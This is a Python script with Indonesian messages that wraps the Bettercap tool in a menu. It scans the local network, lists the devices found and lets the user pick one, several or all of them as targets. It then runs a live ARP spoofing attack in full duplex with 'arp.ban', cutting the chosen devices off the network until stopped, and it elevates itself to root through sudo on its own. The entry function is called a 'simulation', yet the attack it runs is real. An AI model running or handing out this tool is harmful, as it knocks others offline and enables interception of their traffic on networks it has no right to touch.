#!/usr/bin/env python3
import sys
import os
import time
import random
import subprocess
import re
import ipaddress
import tempfile

# ---------- ANSI ----------
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "bright_green": "\033[38;5;46m",
    "red": "\033[91m",
    "gray": "\033[90m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
    "magenta": "\033[35m",
}

GLITCH_CHARS = "!@#$%^&*<>/\\|_+=~`"

BOX_WIDTH = 40

# ================= DRAW BOX =================

def draw_box_top(color=COLORS["cyan"]):
    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")

def draw_box_bottom(color=COLORS["cyan"]):
    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")

def draw_box_title(title: str, color=COLORS["cyan"], text_color=COLORS["yellow"]):
    inner = f" {title}"
    pad = BOX_WIDTH - len(inner)
    if pad < 0:
        inner = inner[:BOX_WIDTH]
        pad = 0
    print(
        f"  {color}{BOLD}║{RESET}"
        f"{text_color}{BOLD}{inner}{RESET}"
        f"{' ' * pad}"
        f"{color}{BOLD}║{RESET}"
    )

# ================= LOADING FUNCTION =================

def loading(text, duration=1):
    """Tampilkan loading sederhana dengan animasi spinner"""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(duration * 10):
        sys.stdout.write(f"\r  {COLORS['yellow']}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

# ================= GLITCH FUNCTIONS =================

def print_glitch_line(text, color=COLORS["green"], cycles=8):
    """Animasi teks gaya glitch satu baris (selesai lalu ganti baris)."""
    n = len(text)
    revealed = [False] * n
    for c in range(cycles):
        display = []
        for i, ch in enumerate(text):
            if ch == " ":
                display.append(" ")
                continue
            if revealed[i]:
                display.append(ch)
            else:
                if random.random() < (c / cycles):
                    revealed[i] = True
                    display.append(ch)
                else:
                    display.append(random.choice(GLITCH_CHARS))
        sys.stdout.write(f"\r{color}{''.join(display)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.03)
    print(f"\r{color}{text}{RESET}")

def exit_with_glitch():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    print_glitch_line("TERMINATING SESSION", COLORS["red"], cycles=14)
    time.sleep(0.3)
    print_glitch_line("DISCONNECTING...", COLORS["gray"], cycles=12)

    for _ in range(15):
        junk = "".join(
            random.choice(GLITCH_CHARS) if random.random() < 0.5 else " "
            for _ in range(40)
        )
        sys.stdout.write(f"\r{COLORS['red']}{junk}{RESET}")
        sys.stdout.flush()
        time.sleep(0.03)

    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    time.sleep(0.2)
    sys.exit(0)

# ================= ROOT CHECK =================

def pastikan_root():
    """Otomatis meminta hak akses sudo jika dijalankan tanpa root."""
    if os.geteuid() != 0:
        print(f"{COLORS['yellow']}[!] Skrip ini membutuhkan akses root untuk menjalankan Bettercap.{RESET}")
        print("[*] Mencoba mengalihkan ke sudo otomatis...\n")
        try:
            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
        except Exception as e:
            print(f"{COLORS['red']}[[-] Gagal mendapatkan akses sudo: {e}{RESET}")
            sys.exit(1)

# ================= BETTERCAP FUNCTIONS =================

def jalankan_bettercap_otomatis():
    """Menjalankan net.probe on dengan loading sederhana"""
    devices = []
    bettercap_cmds = "net.probe on; sleep 3; net.show; quit"
    cmd = ["bettercap", "-silent", "-eval", bettercap_cmds]
    
    # Tampilkan loading
    loading("Scanning network...", 2)
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Tunggu proses selesai
        while process.poll() is None:
            time.sleep(0.1)
            
        output, _ = process.communicate()

        # Membersihkan kode warna ANSI bawaan Bettercap
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-9?]*[a-zA-Z])')
        clean_output = ansi_escape.sub('', output)

        for line in clean_output.splitlines():
            if "─" in line or "┌" in line or "└" in line or "┤" in line:
                continue

            parts = [p.strip() for p in line.split("│") if p.strip()]
            if len(parts) >= 2:
                ip = parts[0]
                mac = parts[1]
                vendor = parts[2] if len(parts) > 2 else "Unknown"

                try:
                    parsed_ip = ipaddress.ip_address(ip)
                except ValueError:
                    continue

                if not isinstance(parsed_ip, ipaddress.IPv4Address):
                    continue

                if ip.lower() != "ip" and not ip.startswith("pilih"):
                    devices.append({
                        "ip": ip,
                        "mac": mac,
                        "vendor": vendor
                    })
                    
    except FileNotFoundError:
        print(f"\n  {COLORS['red']}[!] Error: 'bettercap' tidak ditemukan di sistem Anda.{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n  {COLORS['red']}[!] Terjadi kesalahan: {e}{RESET}")
        
    return devices

def jalankan_arp_attack(targets):
    """Jalankan Bettercap secara interaktif dan kirim perintah arp.spoof + arp.ban"""
    if isinstance(targets, list):
        targets = ",".join(targets)

    cmd = ["bettercap", "-silent"]

    print(f"\n  {COLORS['cyan']}[LIVE] Menjalankan BAN ON...{RESET}")
    print(f"  {COLORS['yellow']}[LIVE] Target: {targets}{RESET}")
    print(f"  {COLORS['gray']}[!] Tekan Ctrl+C untuk menghentikan serangan.{RESET}\n")

    try:
        process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            text=True,
        )
    except FileNotFoundError:
        print(f"\n  {COLORS['red']}[!] Error: 'bettercap' tidak ditemukan di sistem Anda.{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n  {COLORS['red']}[!] Terjadi kesalahan saat menjalankan Bettercap: {e}{RESET}")
        sys.exit(1)

    try:
        time.sleep(0.6)
        if process.stdin is not None:
            process.stdin.write(f"set arp.spoof.targets {targets}\n")
            process.stdin.write("set arp.spoof.fullduplex true\n")
            process.stdin.write("arp.spoof on\n")
            process.stdin.write("arp.ban on\n")
            process.stdin.flush()

        while True:
            if process.poll() is not None:
                print(f"\n  {COLORS['red']}[!] Bettercap berhenti mendadak.{RESET}")
                break

            text = " BAN ON "
            glitched = []
            for ch in text:
                if ch == " ":
                    glitched.append(ch)
                elif random.random() < 0.22:
                    glitched.append(random.choice(GLITCH_CHARS))
                else:
                    glitched.append(ch)
            sys.stdout.write(f"\r  {COLORS['red']}[ATTACKING]{''.join(glitched)}{RESET}")
            sys.stdout.flush()
            time.sleep(0.4)

    except KeyboardInterrupt:
        if process.stdin is not None:
            try:
                process.stdin.write("arp.ban off\n")
                process.stdin.write("arp.spoof off\n")
                process.stdin.write("quit\n")
                process.stdin.flush()
            except BrokenPipeError:
                pass

        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait()

        sys.stdout.write(CLEAR)
        sys.stdout.flush()
        print_glitch_line("[!] ARP attack dihentikan. Memulihkan target...", COLORS["red"], cycles=20)
        time.sleep(1.5)
        return

def parse_target_selection(selection, max_index):
    targets = set()
    for part in selection.split(','):
        part = part.strip()
        if not part:
            continue
        if '-' in part:
            bounds = part.split('-', 1)
            if len(bounds) != 2:
                return None
            try:
                start = int(bounds[0].strip())
                end = int(bounds[1].strip())
            except ValueError:
                return None
            if start < 1 or end < start or end > max_index:
                return None
            targets.update(range(start, end + 1))
        else:
            try:
                idx = int(part)
            except ValueError:
                return None
            if idx < 1 or idx > max_index:
                return None
            targets.add(idx)
    return sorted(targets)

def back_to_bettercap_menu():
    """Kembali ke bettercap-menu.py"""
    menu_path = os.path.join(os.path.dirname(__file__), "bettercap-menu.py")
    if not os.path.exists(menu_path):
        menu_path = os.path.join(os.path.dirname(__file__), "..", "bettercap-menu.py")
    if os.path.exists(menu_path):
        os.execvp(sys.executable, [sys.executable, menu_path])
    else:
        print(f"\n  {COLORS['red']}[✗] bettercap-menu.py tidak ditemukan.{RESET}")
        input("\n  Tekan Enter untuk kembali...")

# ================= DISPLAY TARGETS =================

def display_targets(live_devices):
    """Tampilkan daftar target dengan format rapi"""
    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    
    draw_box_top(COLORS["cyan"])
    draw_box_title("TARGET LIST", COLORS["cyan"], COLORS["yellow"])
    draw_box_bottom(COLORS["cyan"])
    
    print("\n" + "  " + "-" * 61)
    header = f"{'NO':<5}{'IP ADDRESS':<18}{'MAC ADDRESS':<20}{'VENDOR'}"
    print(f"  {BOLD}{header}{RESET}")
    print("  " + "-" * 61)
    
    for i, dev in enumerate(live_devices, start=1):
        line = f"{i:<5}{dev['ip']:<18}{dev['mac']:<20}{dev['vendor']}"
        print(f"  {COLORS['green']}{line}{RESET}")
        
    print("  " + "-" * 61)
    all_no = len(live_devices) + 1
    print(f"  {COLORS['yellow']}{all_no}. TARGET ALL DEVICES{RESET}")
    print(f"  {COLORS['cyan']}p. PICK TARGETS{RESET}")
    print(f"  {COLORS['magenta']}r. REFRESH / SCAN ULANG{RESET}\n")
    print(f"  {COLORS['red']}0. BACK TO MENU{RESET}")
    print(f"  {COLORS['red']}99. EXIT{RESET}")
    
    print()
    sys.stdout.write(f"  {COLORS['yellow']}>> pilih nomer target: {RESET}")
    sys.stdout.flush()

# ================= MAIN =================

def run_simulation():
    pastikan_root()

    # Initial scan
    draw_box_top(COLORS["cyan"])
    draw_box_title("BETTERCAP BAN", COLORS["cyan"], COLORS["yellow"])
    draw_box_bottom(COLORS["cyan"])
    print()
    
    live_devices = jalankan_bettercap_otomatis()
    
    if not live_devices:
        live_devices = [
            {"ip": "192.168.1.1", "mac": "00:11:22:33:44:55", "vendor": "Gateway (No other hosts found)"}
        ]

    while True:
        display_targets(live_devices)
        choice = input().strip()
        
        # ===== FITUR REFRESH =====
        if choice.lower() == "r":
            print(f"\n  {COLORS['cyan']}[*] Me-refresh scan...{RESET}")
            
            # Scan ulang
            live_devices = jalankan_bettercap_otomatis()
            
            if not live_devices:
                live_devices = [
                    {"ip": "192.168.1.1", "mac": "00:11:22:33:44:55", "vendor": "Gateway (No other hosts found)"}
                ]
            
            print(f"  {COLORS['green']}[✓] Scan selesai! {len(live_devices)} perangkat ditemukan.{RESET}")
            time.sleep(0.8)
            continue  # Kembali ke display target dengan data baru
            
        # ===== PILIH TARGET =====
        elif choice.lower() == "p":
            sys.stdout.write(f"  {COLORS['yellow']}>> who else the target (contoh: 1-4, 1,3,5): {RESET}")
            sys.stdout.flush()
            selection = input().strip()
            picked = parse_target_selection(selection, len(live_devices))
            if not picked:
                print(f"\n  {COLORS['red']}Pilihan target tidak valid.{RESET}")
                time.sleep(0.8)
                continue
            target_ips = [live_devices[i - 1]['ip'] for i in picked]
            print(f"\n  {COLORS['red']}[LIVE] Target dikunci ke IP: {', '.join(target_ips)}{RESET}")
            time.sleep(1.0)
            jalankan_arp_attack(target_ips)
            
        elif choice == "0":
            back_to_bettercap_menu()
            
        elif choice == "99":
            exit_with_glitch()
            
        elif choice == str(len(live_devices) + 1):
            target_ips = [dev['ip'] for dev in live_devices]
            print(f"\n  {COLORS['red']}[LIVE] Target dikunci ke: SEMUA PERANGKAT{RESET}")
            time.sleep(1.0)
            jalankan_arp_attack(target_ips)
            
        elif choice.isdigit() and 1 <= int(choice) <= len(live_devices):
            selected = live_devices[int(choice) - 1]
            print(f"\n  {COLORS['red']}[LIVE] Target dikunci ke IP: {selected['ip']}{RESET}")
            time.sleep(1.0)
            jalankan_arp_attack(selected['ip'])
            
        else:
            print(f"\n  {COLORS['red']}Pilihan tidak valid.{RESET}")
            time.sleep(0.8)

if __name__ == "__main__":
    try:
        run_simulation()
    except KeyboardInterrupt:
        print("\n\nAborted.")
        sys.exit(0)